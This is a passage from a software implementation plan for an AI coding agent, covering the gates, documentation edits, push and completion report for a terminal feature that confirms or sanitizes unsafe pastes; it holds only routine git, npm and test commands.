Expected: `tsc ok`, then ESLint prints no `error` lines. `react-hooks/*` rules are `warn` in `frontend/eslint.config.js:30-40`. If a warning points at a line this plan added, fix it when the fix is local; otherwise quote the warning in the final report.

- [ ] **Step 6: Commit**

```bash
cd "$(git rev-parse --show-toplevel)" && git add frontend/src/renderer/components/BlockTerminal.tsx frontend/src/renderer/components/BlockTerminal.test.tsx && git commit -m "feat(frontend): terminal panes confirm unsafe pastes

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

### Task 6: Gates

**Files:** none changed. If a gate fails because of this branch, fix it in the task's files, rerun the task's own tests, and commit with explicit paths.

**Interfaces:**
- Consumes: everything above.
- Produces: one output line per gate for the final report.

Run each gate and copy its **last meaningful line** into your notes as `gate — result — line`. If a gate cannot run, record `not run: <reason>`. For a failure in a file this branch did not touch, run the same gate on `origin/development` in a scratch worktree (Step 8) before calling it pre-existing.

- [ ] **Step 1: Terminal package, full (build + every workspace suite + node tests; same as CI `terminal.yml:55`)**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm test 2>&1 | tail -30
```

Expected: every workspace's vitest summary shows `0 failed`, and the node `--test` summary shows `# fail 0`.

- [ ] **Step 2: Boundaries**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run check:boundaries
```

Expected: `boundary check passed` and `no ownership timers found (…)`.

- [ ] **Step 3: No `vt-core` change: say so, and prove it**

```bash
cd "$(git rev-parse --show-toplevel)" && git diff --stat origin/development -- packages/terminal/crates backend/internal/adapters/runtime/ptyhost
```

Expected: no output. So no Rust tests, no host-mirror wasm rebuild and no daemon rebuild are required (`TERMINAL.md` §3.5 applies only to `vt-core` changes). Record "no vt-core change: wasm/daemon rebuild not required".

- [ ] **Step 4: Frontend typecheck (CI's command; its `pretypecheck` rebuilds the terminal package)**

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && npm run typecheck 2>&1 | tail -5
```

Expected: exit 0 with no `error TS` lines.

- [ ] **Step 5: Frontend lint**

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && npm run lint 2>&1 | tail -5
```

Expected: `✖ N problems (0 errors, M warnings)` or no output. **0 errors** is the gate.

- [ ] **Step 6: Frontend full vitest (as CI `frontend.yml:66-69`)**

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && npm run browser-runtime:prepare -- --quiet; OPERATOR_AGENT_BROWSER_TEST_BINARY="$(git rev-parse --show-toplevel)/frontend/agent-browser/agent-browser" npx vitest run 2>&1 | tail -8
```

Expected: `Test Files  N passed (N)` with `0 failed`. If `browser-runtime:prepare` fails, the agent-browser tests may fail. List them, and check them against the baseline in Step 8.

- [ ] **Step 7: Bench gates (need Playwright Chromium from Task 0 Step 7)**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run bench:feel 2>&1 | tail -3
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run bench:selection 2>&1 | tail -3
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run bench:agent:gate 2>&1 | tail -3
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run bench:agent:scroll 2>&1 | tail -3
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run bench:affordances -- --action hover 2>&1 | tail -3
```

Expected:
- `PASS feel gate: zero pixel diff` (`bench/agent-session/feel-gate.mjs:87`). This plan changes no pixels, so any diff is a regression; do **not** re-record baselines.
- `PASS selection survived N repaints` (`bench/selection-gate.mjs:63`).
- `PASS agent-session gate` (`bench/agent-session/run.mjs:392`). It may need Go for the reopen row (`TERMINAL.md` §3.1). If `go` is missing, record `not run: go not installed`.
- `bench:agent:scroll` prints JSON lines and exits 0 (a failure prints `FAIL …`, `scroll-gate.mjs:100`).
- `bench:affordances` records side-by-side screenshots only and is never diffed (`TERMINAL.md` §6). Record its exit code.

If Chromium could not be installed, record `not run: Playwright Chromium unavailable` for each.

- [ ] **Step 8: Baseline comparison for any failure outside this branch's files (only if needed)**

```bash
cd "$(git rev-parse --show-toplevel)" && git worktree add ../plan1-baseline origin/development && cd ../plan1-baseline && npm ci --prefix packages/terminal && npm ci --prefix frontend && npm --prefix packages/terminal run build
```

Then rerun the failing gate's exact command with `plan1-baseline` in place of the repo root. If it fails the same way there, record it as `pre-existing on origin/development`. Remove the worktree afterwards with `git worktree remove ../plan1-baseline`. Never use `git stash`.

No commit in this task unless a fix was needed.

---

### Task 7: Docs

**Files:**
- Modify: `packages/terminal/CHANGELOG.md:3-5`
- Modify: `TERMINAL.md` (insert before `## 5. Known gaps (not bugs, decisions pending)`, currently line 834)
- Modify: `docs/terminal/2026-09-19-terminal-reference-survey.md:50`, `:63`, `:82`, `:768`, `:1788`
- Modify: `docs/terminal/2026-09-24-not-done-plain-language.md:5-7`, `:37-41`, `:147`

**Interfaces:** none (docs only). Plain English, no new code comments, cite `file:line`. Write "Roadmap Plan 1" because the survey already uses "Plan 4" for the background-pane plan.

- [ ] **Step 1: CHANGELOG. In `packages/terminal/CHANGELOG.md` replace**

```markdown
## Unreleased

```

(lines 3-4, the heading and the blank line after it) with:

```markdown
## Unreleased

- core/editor/react: paste safety (roadmap Plan 1, survey §1.10 and §2.11). `encodePaste(text, bracketedPaste)` in `ts/editor/src/paste.ts` returns the pty bytes and a verdict. Inside bracketed paste every `ESC[201~`, then every `ESC` and `^C`, is removed (Alacritty's rule, `alacritty/src/event.rs:1369-1410`) and the paste is always safe; before, only the literal `ESC[201~` was removed. Outside bracketed paste, when the child owns the line, `\r\n`/`\n` still become `\r`, and the paste is unsafe with reason `"paste-end"` (it holds `ESC[201~`), `"control"` (a C0 control other than tab, LF or CR) or `"newline"` (Ghostty's `isSafe`, `src/input/paste.zig:160-190`, plus control characters). `deliverPaste` sends a safe paste at once and asks the new optional `HostCapabilities.confirmPaste(preview, reason)` for an unsafe one; `false`, a rejection or a throw sends nothing, and a paste confirmed after its editor or alt-screen handler was torn down is dropped. With no `confirmPaste` the bytes are sent at once, exactly as before. The line editor's own line (a shell prompt) is unchanged and never asks. `pastePreview` shows CR as a line break and controls as `^X`. `LineEditor.setPasteConfirm`, `PasteUnsafeReason` (core, re-exported by react) and `PasteVerdict`/`EncodedPaste`/`PasteConfirm` (editor) are new. Behaviour only: no Ghostty or Alacritty code was copied. No `vt-core` change.
```

- [ ] **Step 2: TERMINAL.md §4.27. Insert immediately before the line `## 5. Known gaps (not bugs, decisions pending)`**

```markdown
### 4.27 A paste that runs by itself — roadmap Plan 1
- Symptom: text copied from a web page with a hidden line break ran as a
  command the moment it was pasted into a pane whose program did not ask for
  bracketed paste, and inside bracketed paste a lone `ESC` or `^C` reached the
  program (`ts/editor/src/paste.ts` before this plan: only `ESC[201~` was
  removed).
- Now: one rule in `ts/editor/src/paste.ts` (`encodePaste`, `deliverPaste`),
  used by the line editor's passthrough (primary screen, where Claude Code
  runs) and by the alternate-screen handler in `TerminalSurface.tsx`.
  Bracketed: strip `ESC[201~`, `ESC` and `^C` and send. Unbracketed while the
  child owns the line: a newline, a C0 control other than tab, or `ESC[201~`
  makes the paste unsafe, and the host's `HostCapabilities.confirmPaste` is
  asked. No handler means send as before (product independence, §3.1). The
  editor-owned line never asks: nothing runs until Enter.
- Operator: `frontend/src/renderer/hooks/usePasteConfirm.tsx` shows the first
  5 lines (200 characters each) and a one-line reason in `ConfirmDialog`,
  wired in `BlockTerminal.tsx`. "Paste" or "Cancel", no "don't ask again".
- References, behaviour only (no code adapted, so no attribution file):
  Ghostty `src/input/paste.zig:160-190`, Alacritty
  `alacritty/src/event.rs:1369-1410`.
- Guards: `paste.test.ts` (verdict table, preview, delivery),
  `line-editor-paste.test.ts`, `TerminalSurface.paste.test.tsx`,
  `frontend/src/renderer/hooks/usePasteConfirm.test.tsx`,
  `BlockTerminal.test.tsx` "BlockTerminal paste confirm".

```

- [ ] **Step 3: Survey status. In `docs/terminal/2026-09-19-terminal-reference-survey.md`**

3a. In line 50, replace `36 done, 17 partial, 26 not done,` with `38 done, 17 partial, 24 not done,`. At the end of the same paragraph, after `Entries marked non-goal were excluded by the agent-TUI spec, not rejected.`, append: ` "Roadmap Plan 1" is the paste-safety plan (`docs/superpowers/plans/2026-09-24-terminal-plan-1-paste-safety.md`).`

3b. Replace line 63:

```markdown
| §1.10 | Not done | `planPaste` still strips `ESC[201~` silently and sends an unbracketed multi-line paste line by line; no unsafe verdict, no confirm. |
```

with:

```markdown
| §1.10 | Done | Roadmap Plan 1 — `encodePaste` returns the bytes and a verdict; outside bracketed paste a newline, a C0 control other than tab, or `ESC[201~` is unsafe and goes to `HostCapabilities.confirmPaste` (Operator: a dialog with the first five lines); no handler sends as before. The editor-owned line never asks. The confirm is a host seam, not surface chrome as the entry proposed. |
```

3c. Replace line 82:

```markdown
| §2.11 | Not done | Bracketed paste still strips only the literal `ESC[201~`; a lone `ESC` or `^C` passes through. |
```

with:

```markdown
| §2.11 | Done | Roadmap Plan 1 — inside bracketed paste `ESC[201~`, every `ESC` and every `^C` are removed and the paste is sent without asking; outside, `\r\n`/`\n` still become `\r`. |
```

3d. Replace line 768:

```markdown
> **Status: Not done.** `planPaste` still strips `ESC[201~` silently and sends an unbracketed multi-line paste line by line; no unsafe verdict, no confirm.
```

with:

```markdown
> **Status: Done (roadmap Plan 1, 2026-09-24).** `encodePaste` gives a verdict; an unsafe unbracketed paste goes to the host's `confirmPaste` (Operator shows a dialog). Deviation from the proposal below: the confirm is a host seam rather than surface chrome, and `ESC[201~` is still stripped inside brackets (with every `ESC` and `^C`, §2.11) instead of refused.
```

3e. Replace line 1788:

```markdown
> **Status: Not done.** Bracketed paste still strips only the literal `ESC[201~`; a lone `ESC` or `^C` passes through.
```

with:

```markdown
> **Status: Done (roadmap Plan 1, 2026-09-24).** Bracketed paste removes `ESC[201~`, then every `ESC` and `^C`.
```

Check the counts after editing:

```bash
cd "$(git rev-parse --show-toplevel)" && awk -F'|' '/^\| §/ {gsub(/ /,"",$3); print $3}' docs/terminal/2026-09-19-terminal-reference-survey.md | sort | uniq -c
```

Expected: `38 Done`, `17 Partial`, `24 Notdone`, `7 Notpursued`, `1 Notneeded`, `1 N/A`. If the Done or Not done numbers differ from the line-50 text, fix the text to match this output. Do not change other rows.

- [ ] **Step 4: Plain-language doc. In `docs/terminal/2026-09-24-not-done-plain-language.md`**

4a. Replace:

```markdown
entries. The 26 entries marked **Not done** are grouped below into 20 items;
the 17 marked **Partial** follow with what each is missing.
```

with:

```markdown
entries. The 26 entries marked **Not done** on 2026-09-24 are grouped below
into 20 items (item 5 has since been done, roadmap Plan 1); the 17 marked
**Partial** follow with what each is missing.
```

4b. Replace lines 37-41:

```markdown
5. **Paste safety (§1.10, §2.11).** Pasting text copied from a web page can
   contain hidden control characters, which can make a command run by
   itself. Operator silently removes only one such trick. *If done:* risky
   pastes are cleaned up or you're asked "this paste will run a command,
   continue?", which protects you from dangerous copy-paste.
```

with:

```markdown
5. **Paste safety (§1.10, §2.11). Done (roadmap Plan 1, 2026-09-24).** When
   the program asked for bracketed paste (Claude Code does), hidden control
   characters are removed before the paste is sent. When it did not, a paste
   with a line break or a hidden control character opens a dialog showing
   the first lines and why, with "Paste" and "Cancel". At a shell prompt
   nothing changed: the paste goes into the line and runs only when you
   press Enter.
```

4c. Replace the "What to pick" bullet:

```markdown
- **Paste safety (#5):** protection against dangerous copy-paste.
```

with:

```markdown
- **Paste safety (#5):** done (roadmap Plan 1).
```

- [ ] **Step 5: Commit**

```bash
cd "$(git rev-parse --show-toplevel)" && git add packages/terminal/CHANGELOG.md TERMINAL.md docs/terminal/2026-09-19-terminal-reference-survey.md docs/terminal/2026-09-24-not-done-plain-language.md && git commit -m "docs(terminal): record paste safety (roadmap Plan 1)

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

### Task 8: Push and report (do not merge)

**Files:** none.

- [ ] **Step 1: Confirm the branch holds exactly this plan's files**

```bash
cd "$(git rev-parse --show-toplevel)" && git status --short && git diff --name-only origin/development...HEAD
```

Expected: empty status. The name list is exactly these files:

```
TERMINAL.md
docs/terminal/2026-09-19-terminal-reference-survey.md
docs/terminal/2026-09-24-not-done-plain-language.md
frontend/src/renderer/components/BlockTerminal.test.tsx
frontend/src/renderer/components/BlockTerminal.tsx
frontend/src/renderer/hooks/usePasteConfirm.test.tsx
frontend/src/renderer/hooks/usePasteConfirm.tsx
frontend/src/renderer/i18n/en.json
packages/terminal/CHANGELOG.md
packages/terminal/ts/core/src/index-browser.ts
packages/terminal/ts/core/src/types.ts
packages/terminal/ts/editor/src/index.ts
packages/terminal/ts/editor/src/line-editor-paste.test.ts
packages/terminal/ts/editor/src/line-editor.ts
packages/terminal/ts/editor/src/paste.test.ts
packages/terminal/ts/editor/src/paste.ts
packages/terminal/ts/react/src/TerminalSurface.paste.test.tsx
packages/terminal/ts/react/src/TerminalSurface.tsx
packages/terminal/ts/react/src/index.ts
```

Any other file means something extra was committed. Remove it from the branch in a new commit (`git rm --cached <path>` or revert its change) before pushing.

- [ ] **Step 2: Check for new comments in new code**

```bash
cd "$(git rev-parse --show-toplevel)" && git diff origin/development...HEAD -- '*.ts' '*.tsx' | grep -E '^\+\s*(//|/\*|\{/\*)' || echo "no added comment lines"
```

Expected: the only matches are the comment lines carried over unchanged in the two rewritten test files and `paste.ts`. They show as `+` only because the files were rewritten: `paste.test.ts` "A pty takes CR…", "The escape would end…", "A pty carries bytes…"; `paste.ts` "WebKit reports an image paste…". Anything else must be removed.

- [ ] **Step 3: Push**

```bash
cd "$(git rev-parse --show-toplevel)" && git push -u origin terminal/plan-1-paste-safety
```

Expected: `branch 'terminal/plan-1-paste-safety' set up to track 'origin/terminal/plan-1-paste-safety'`. Do **not** open or merge a PR into `development` or `master`.

- [ ] **Step 4: Write the completion report as the final message of the session (not a file)**

Use this structure, filled with real output:

```
Branch: terminal/plan-1-paste-safety (pushed, not merged), head <sha>
Commits: <sha> <subject> (one line each)

Gates
- editor vitest — passed — "<Tests … line>"
- react vitest — passed — "<Tests … line>"
- packages/terminal npm test — passed/failed — "<summary line>"
- check:boundaries — passed — "boundary check passed"
- vt-core change — none — wasm/daemon rebuild not required
- frontend typecheck — passed — "<last line or exit 0>"
- frontend lint — passed — "<✖ N problems (0 errors, M warnings)>"
- frontend vitest — passed — "<Test Files … line>"
- bench:feel — "<PASS feel gate: zero pixel diff>" or "not run: <reason>"
- bench:selection — "<PASS selection survived N repaints>" or "not run: <reason>"
- bench:agent:gate — "<PASS agent-session gate>" or "not run: <reason>"
- bench:agent:scroll — "<exit 0>" or "not run: <reason>"
- bench:affordances --action hover — "<exit code>" or "not run: <reason>"
Pre-existing failures (verified on origin/development): <list or "none">
Deviations from the plan: <list or "none">

Not done here, by design: real-app verification is done locally by the
reviewer — paste a multi-line text and a text with ESC into a Claude Code
pane (bracketed: no dialog, ESC/^C stripped) and into a shell pane at a
running command such as `cat` (dialog appears; Cancel sends nothing; Paste
sends it), plus a paste at an idle shell prompt (goes into the line, no
dialog), in the Operator desktop app.
```

Every "passed" must quote its output line. Never write "passed" for a command that did not run.
